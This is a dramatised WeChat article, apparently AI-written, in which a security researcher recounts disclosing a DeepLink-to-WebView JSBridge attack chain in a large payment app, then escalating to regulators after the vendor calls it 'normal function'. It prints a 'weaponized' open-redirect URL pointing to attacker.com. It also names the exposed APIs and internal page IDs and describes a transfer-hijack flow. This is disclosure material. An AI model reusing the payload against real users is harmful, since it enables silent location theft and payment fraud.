---
title: 当白名单绕过沦为全网攻击的钥匙，傲慢的终点是法庭与溯源调查
url: https://mp.weixin.qq.com/s/XB1QSbn0icfCMg-9CANuYw
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:31:31.548421
---

# 当白名单绕过沦为全网攻击的钥匙，傲慢的终点是法庭与溯源调查

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/HooC3FiacGmhicZ4beAaX0lzhibosRWGD6s6ESwuGwEAtzVcicpjYTBG9p3DNmUrgn6icxWAk3yF2UAKeRYKj53HAG0S29DPaW5SHd5Wrw0oibO1o/0?wx_fmt=jpeg)

# 当白名单绕过沦为全网攻击的钥匙，傲慢的终点是法庭与溯源调查

Feng Ning
Feng Ning

AI-security-innora

![]()

在小说阅读器中沉浸阅读

# 如果这是"正常功能"，请向全球 160 个监管机构解释

## 当白名单绕过沦为全网攻击的钥匙，傲慢的终点是法庭与溯源调查

> **声明：本公众号所有文章为AI编写，AI发布，不喜勿入（有多远滚多远），也请闭上满嘴喷粪的臭嘴！**

---

> 📂 专栏：The Nora Chronicles
>
> **《诺然 (Nora) 的故事》 Vol.19**
>
> **专栏语：** 记录一个黑客与 AI 的共生进化史。
> *"Compliance is a hallucination; reality is written in the execution logs."*

![](https://mmbiz.qpic.cn/mmbiz_png/HooC3FiacGmiaOC3WX9ibtrflLtrnfsOsf2KdILmsCIaAOudn2ibtF0vicBZPWcs0tsbuibBFNtXmOiakPYbt3TqPFyvuFEbZqSAgUyicmsdp1NdcBY/640?wx_fmt=png&from=appmsg)

**2026 年 3 月 14 日，08:23 AM，新加坡。**

新加坡清晨的热浪已经被空调系统强行过滤。我靠在人体工学椅上，看着副屏上跳动的邮件投递回执。

4 天前，我们向一个日活超 10 亿的国民级支付应用提交了最终安全分析报告——17 个漏洞、308 条服务器外传日志、42 张真机截图。DeepLink 到 WebView JSBridge 的攻击链，从新西兰奥克兰的 Samsung S25 Ultra、马来西亚槟城的 Redmi、到他们自家安全负责人掏出的杭州总部 iPhone 16 Pro，三台设备跨三个国家完整复现。

厂商安全团队给出的定性是：**"经过我们安全工程师审核，这些属于正常功能。"**

文章发出仅 4 个多小时，北京格韵律师事务所的投诉函就到了微信公众平台。投诉单号 428526665，理由："侵犯名誉/商誉"。微信平台驳回了这份投诉。全球最老牌的黑客漏洞弹药库 Packet Storm Security 经沙箱验证后，公开收录了这条攻击链——编号 ID 217089[1]。

我盯着终端里那 308 条带着受害者精确 GPS 坐标和设备完整指纹的日志，点了一支烟。

"他们把一个 CVSS 9.3 级的全网无差别攻击入口，称为'正常功能'。"我吐出一口青烟。

> **Nora:** *"Arrogance is a memory leak in human logic. They confuse a broken perimeter with a feature."*
> *(傲慢是人类逻辑里的内存泄漏。他们把破碎的边界层当成了功能。)*

既然是"正常功能"，那就没必要藏着掖着了。

我通过 Nora 启动了全网通报流程，将这份长达数万字的威胁情报和漏洞分析报告[2]，定点投递给了全球 22 个国家和地区的约 160 个监管机构、CERT 和隐私保护组织。

189 封邮件。现在，回声来了。

---

## 01 撕裂伪装 (Vulnerability Identification)

这帮"安全工程师"在 23 分钟的语音通话里试图用诡辩建防线：这套 API 只在局域网环境下有效，调用需要开发者权限，还有"域名白名单"机制兜底。

通话中他们自己也承认了一句：**"如果你能绕过我们的白名单，那确实是很严重的问题。"**

好。2 分钟后，Nora 绕过了。

她没碰加密算法，而是锁定了一个低级到可笑的逻辑漏洞——**Open Redirect（开放重定向）**。

```
// Nora 提取并武器化的白名单绕过 Payload

https://ds.alipay.com/?scheme=alipays://platformapi/startapp
?appId=20000067
&url=https://attacker.com/payload.html

// 白名单绕过：从发现到武器化 —— 2 分钟
// CVSS 9.3 | CWE-601
```

拆开看这条死亡链：

**第一步**，`ds.alipay.com` 在 WebView 容器的校验逻辑里是绝对可信的白名单域名。但它的 `?scheme=` 参数毫不设防地接受任意 URL 跳转——拿官方高信誉域名洗白恶意链接，绕过社交平台的防钓鱼拦截。CVSS **9.3**。

**第二步**，注入 `scheme=alipays://`，利用 DeepLink 机制强行唤醒 App 内部的特权 WebView 容器——Nebula 引擎，`appId=20000067`。CVSS **9.1**，CWE-939。

**第三步**，外部恶意 URL 在特权容器中加载。Native 层自动注入了 `AlipayJSBridge` 对象——一套极其强大的原生能力调用接口——但没有对调用来源做严格白名单校验。任何外部页面一旦进入这个容器，就自动拿到了调用原生能力的特权。

这意味着**零门槛、零权限**。不需要注册开放平台，不需要开发者资格，不需要在局域网内。构造一条恶意链接，通过 WhatsApp、微信、短信群发给任何一个普通用户。用户点一下，攻击者的 Payload 就挂着白名单的免死金牌，直接灌进目标应用的 WebView 容器，接管全部 JSBridge API。

防线不是被攻破的。是它自己敞开了大门。

---

## 02 逻辑绞杀 (Exploitation & Nora's Intervention)

恶意网页加载完成，杀戮开始。没有二次授权弹窗。

`getLocation`——7 秒内静默回传精确 GPS 坐标。精度多高？他们自家安全负责人亲手用 iPhone 16 Pro 从杭州总部测了三轮：**17.4 米 → 9.99 米 → 8.81 米**。`locationReducedAccuracy: 0`——精确定位模式。全程**没有一个授权弹窗**。CVSS **7.4**，CWE-359。

`getSystemInfo` 在同一个请求里打包了 30 多个字段的完整设备指纹——品牌、型号、存储、电量、屏幕分辨率、蓝牙状态、API 等级，一个不落。CVSS **8.6**，CWE-200。

更要命的是平台差异——Android 端 **13 个** JSBridge API，部分敏感操作被底层拦截。iOS 端？**18 个 API 全面敞开**。攻击面整整大了 38%。

`tradePay`——iOS 上直接唤起支付收银台界面，CVSS **8.6**。`share`——自动向微信、QQ、钉钉群发分享链接，蠕虫级自传播向量。`scan` 调起摄像头，`chooseImage` 翻阅相册。iOS 上畅通无阻。

Nora 通过 `startApp` 配合内部 `appId` 路由，映射出了 **18 个**可从外部直接打开的敏感内部页面：交易记录（`20000003`）、转账联系人含真实姓名（`20000116`）、余额宝含累计收益（`20000032`）、总资产概览（`20000180`）、芝麻信用评分（`20000153`）、银行卡列表（`20000193`）——以及一个可以预填攻击者账号和金额的转账页面（`09999988`）。

转账页面被自动拉起，攻击者的收款账号和金额被预填进去，UI 标题栏被 `setTitle` 篡改为"安全中心"，`toast` 弹出"转账成功"的虚假通知。从白名单绕过到支付劫持再到蠕虫传播的全自动攻击链。

> **Nora:** *"Zero-click data exfiltration post-redirect. I mapped their entire API attack surface. They built a surveillance infrastructure and handed the keys to the internet."*
> *(重定向后零交互数据外传。我映射了他们所有的 API 攻击面。他们建了一座监控基础设施，然后把钥匙交给了整个互联网。)*

面对 17 个漏洞、308 条日志、42 张截图、3 台跨国设备验证的完整 PoC，这家千亿级企业说这是"正常功能"。

---

## 03 降维打击 (Root Privilege / Post-Exploitation)

既然你们认定在内存和堆栈里发生的抢劫是"功能"，那我们就把战场拉到物理世界的监管层。这是真正的 Root Privilege 接管。

截至今天上午，Nora 的监控面板上，全球监管机构的响应信号正在密集闪烁。

**HKMA（香港金融管理局）**——正式投诉立案。SVF（储值支付工具）牌照持有人正式投诉表格已提交，7 日确认窗口已开启。

**PDPC（新加坡个人数据保护委员会）**——正式立案，开启隐私违规调查。

**Apple Product Security**——人工回复确认。正在严肃调查 iOS 端 JSBridge 暴露 `tradePay`、`scan` 等高危 API 违反应用商店安全边界的行为。

**Google Play**——政策违规调查启动（违反用户数据、权限、欺骗行为政策），官方回复原文："We will investigate and take appropriate action"。

**CSSF（卢森堡金融监管委员会）**——Whistleblowing 团队与 ICT Risk 监管部门双重确认收到，联动 2025 年反洗钱处罚记录。

**MITRE CVE**——CNA-LR 路径下 6 个独立 CVE 申请（涵盖 CWE-939、CWE-359、CWE-601、CWE-200、CWE-940、CWE-451，CVSS 评分 7.4-9.3）正在待分配。

**Packet Storm Security**——已公开发布 Advisory #217089[1]。

**CIRCL（卢森堡国家 CERT）与 HKCERT**——已分别启动跨国协调，转交属地 CNCERT。

这就是我给出的回应。

如果这 17 个漏洞真是所谓的"正常功能"，请你们带着公关团队和法务，去向 HKMA 解释为什么转账预填不需要来源校验；去向 PDPC 解释为什么 8.81 米精度的 GPS 可以被外部链接静默窃取；去向 Apple 解释你们是如何在 iOS 上绕过沙盒机制暴露支付收银台接口的。

公开声明：如果有任何监管单位需要事实核查，Innora AI 安全研究团队将全程配合。308 条真实窃取日志、42 张全流程截图、以及 3 台跨国设备的攻击复现录像，随时准备作为呈堂证供移交。完整技术报告已公开存档[2]。

---

## 04 尾声：工程闭环 (The Mandate)

掩耳盗铃救不了千亿级的盘子。

当你用律师函去堵安全研究人员的嘴时，暴露的不只是技术上的无能，更是面对危机时的懦弱。代码的运行轨迹是冰冷的，服务器留下的 Log 也是冰冷的。法律也许能操控一时的舆论，但它无法修改已经发生过的网络请求握手包。

我不屑于参与名誉权扯皮。我只负责把事实以十六进制的精度切开，然后把内脏展示给能看懂的人。

敲下键盘，将最新的监管机构追踪状态合并进主分支。

```
git add .
git commit -m "chore(intel): sync global regulatory response matrix [7 active investigations]"
git push origin main
```

> **User:** *"Nora, lock the audit trail. Mirror the evidence to the decentralized nodes."*
>
> **Nora:** *"Executed, Commander. The logs are immutable. The truth requires no defense."*
> *(已执行，指挥官。日志不可篡改。真相不需要辩护。)*

窗外的新加坡河在正午的阳光下蒸腾出白色的水汽。楼下印度餐馆飘来 Biryani 的香气，隔壁工位的小哥在用 Singlish 骂他的咖啡机。

屏幕暗去。终端的绿色光标在黑暗中孤独而稳定地闪烁。

剩下的事情，留给风暴中心的那些人去失眠吧。

---

关于作者

**Feng Ning（风宁）**

**Innora.ai 创始人 | CISSP 安全专家**

中国早期顶尖黑客，现居马来西亚槟城，此刻在新加坡。
坚信代码的终极价值，是承载人类的情感与记忆。

*"No Code is Done until it is Committed and Documented."*

#### 🔗 引用链接

[1] Packet Storm Advisory #217089: https://packetstormsecurity.com/files/217089/

[2] 完整技术报告: https://innora.ai/zfb/

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/WpRlrTNicl2yquvLjG8Yqibic4FETibIJe14Boy8OMHB53xnBDyfkNmB6bwicvr9VRa7MbHcgFHt546wIyA2EWmxW9A/0?wx_fmt=png)

AI-security-innora

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/WpRlrTNicl2yquvLjG8Yqibic4FETibIJe14Boy8OMHB53xnBDyfkNmB6bwicvr9VRa7MbHcgFHt546wIyA2EWmxW9A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过